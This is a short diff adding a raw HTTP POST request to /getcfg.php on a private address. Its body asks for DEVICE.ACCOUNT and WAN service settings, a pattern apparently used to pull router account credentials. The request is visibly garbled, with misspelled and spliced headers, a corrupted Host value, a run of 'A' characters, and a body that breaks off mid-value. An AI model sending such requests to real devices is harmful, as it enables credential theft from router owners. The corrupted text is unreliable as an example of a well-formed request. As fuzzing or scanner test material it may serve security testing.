@@ -1,0 +1,12 @@
+Contnt-POST /getcfg.php HTTP/1.1
+Host: 17>.21.0.2ls.php
+Accept-EncodingAAAAAAAAAALength: 73
+User-Agent: MozIlla/5.0 (X11; Linux6x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/128.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-in: http://172.21.0.2
+Referer: http://172.21.0.2/too
+Connection: keep-alive
+Czip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: uid=yWNeBthVkJ
+
+SERVICES=DEVICE.ACCOUNT%2CHTP.WAN-1%2CHTTP.WAN-2%2CINBFILTER%2CS
